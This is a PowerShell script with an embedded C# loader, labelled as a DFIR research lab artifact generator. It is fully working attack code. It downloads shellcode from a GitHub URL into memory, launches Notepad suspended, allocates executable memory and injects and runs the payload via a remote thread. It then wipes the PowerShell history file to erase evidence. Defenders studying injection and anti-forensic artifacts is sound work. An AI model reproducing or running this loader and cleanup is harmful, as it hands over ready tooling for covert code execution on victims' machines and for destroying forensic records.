<#
    PROJECT: Fileless Process Hollowing Simulation
    PURPOSE: DFIR Research Lab - Artifact Generation
    AUTHOR: [Your Name]
    
    DISCLAIMER: For educational and defensive research purposes only.
#>

# --- CONFIGURATION ---
# [IMPORTANT] Replace this URL with the RAW GitHub link to your payload.bin
$PayloadUrl = "https://raw.githubusercontent.com/stumbs/NotePadInjection/main/payload.bin"


# --- PART 1: THE C# LOADER (The Engine) ---
# This block defines the Windows API calls we need to access memory directly.
$Code = @"
using System;
using System.Runtime.InteropServices;
using System.Net;

public class FilelessLoader {
    
    // --- P/Invoke Definitions (The Bridge to the Windows Kernel) ---
    
    [DllImport("kernel32.dll")]
    public static extern bool CreateProcess(
        string lpApplicationName, 
        string lpCommandLine, 
        IntPtr lpProcessAttributes, 
        IntPtr lpThreadAttributes, 
        bool bInheritHandles, 
        uint dwCreationFlags, 
        IntPtr lpEnvironment, 
        string lpCurrentDirectory, 
        ref STARTUPINFO lpStartupInfo, 
        out PROCESS_INFORMATION lpProcessInformation
    );

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess, 
        IntPtr lpAddress, 
        uint dwSize, 
        uint flAllocationType, 
        uint flProtect
    );

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess, 
        IntPtr lpBaseAddress, 
        byte[] lpBuffer, 
        uint nSize, 
        out IntPtr lpNumberOfBytesWritten
    );

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess, 
        IntPtr lpThreadAttributes, 
        uint dwStackSize, 
        IntPtr lpStartAddress, 
        IntPtr lpParameter, 
        uint dwCreationFlags, 
        IntPtr lpThreadId
    );

    // --- Data Structures Required by Windows APIs ---

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO { 
        public uint cb; 
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { 
        public IntPtr hProcess; 
        public IntPtr hThread; 
        public int dwProcessId; 
        public int dwThreadId; 
    }

    // --- The Main Logic ---
    public static void Execute(string url) {
        try {
            Console.WriteLine("[*] Fetching payload from GitHub (Memory Only)...");
            
            // 1. Download the Payload
            // Use TLS 1.2 to ensure connection to GitHub works
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient wc = new WebClient();
            byte[] shellcode = wc.DownloadData(url);
            
            if (shellcode.Length == 0) {
                Console.WriteLine("[-] Download failed. Check URL.");
                return;
            }

            Console.WriteLine("[*] Starting Notepad in Suspended State...");
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            
            // 2. Create the Victim Process (Notepad)
            // 0x4 = CREATE_SUSPENDED flag
            bool success = CreateProcess(@"C:\Windows\System32\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            
            if (!success) { 
                Console.WriteLine("[-] Failed to create process."); 
                return; 
            }

            Console.WriteLine("[*] Allocating RWX Memory in Notepad (PID: " + pi.dwProcessId + ")...");
            
            // 3. Allocate Memory
            // 0x3000 = MEM_COMMIT | MEM_RESERVE
            // 0x40 = PAGE_EXECUTE_READWRITE (This is the forensic red flag!)
            IntPtr remoteMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);

            Console.WriteLine("[*] Injecting Shellcode...");
            
            // 4. Copy the Payload
            IntPtr bytesWritten;
            WriteProcessMemory(pi.hProcess, remoteMem, shellcode, (uint)shellcode.Length, out bytesWritten);

            Console.WriteLine("[*] Detonating Payload via Remote Thread...");
            
            // 5. Execute
            CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteMem, IntPtr.Zero, 0, IntPtr.Zero);
            
            Console.WriteLine("[+] Success! Payload is running inside Notepad.");
        }
        catch (Exception e) {
            Console.WriteLine("[-] Error: " + e.Message);
        }
    }
}
"@


# --- PART 2: ANTI-FORENSICS (The Cleaner) ---
function Invoke-StealthCleanup {
    Write-Host "`n[*] Initiating Anti-Forensic Cleanup..." -ForegroundColor Yellow

    # 1. Stop recording new commands to the history file
    # This releases the file lock so we can delete it.
    Set-PSReadlineOption -HistorySaveStyle SaveNothing

    # 2. Find the history file path
    $HistoryPath = (Get-PSReadlineOption).HistorySavePath
    
    # 3. Delete the file
    if (Test-Path $HistoryPath) {
        try {
            Remove-Item -Path $HistoryPath -Force -ErrorAction SilentlyContinue
            Write-Host "[+] Artifact Deleted: PowerShell History file wiped." -ForegroundColor Green
        }
        catch {
            Write-Host "[-] Cleanup Failed: File locked or permission denied." -ForegroundColor Red
        }
    } else {
        Write-Host "[!] No history file found (Already clean?)." -ForegroundColor DarkGray
    }
}


# --- PART 3: EXECUTION CHAIN ---

# A. Compile the C# Loader into RAM
Write-Host "[*] Compiling Loader in Memory..." -ForegroundColor Cyan
try {
    Add-Type -TypeDefinition $Code -Language CSharp
}
catch {
    Write-Error "Compilation Failed. Check for syntax errors."
    exit
}

# B. Run the Attack
[FilelessLoader]::Execute($PayloadUrl)

# C. Wipe the Tracks
Invoke-StealthCleanup
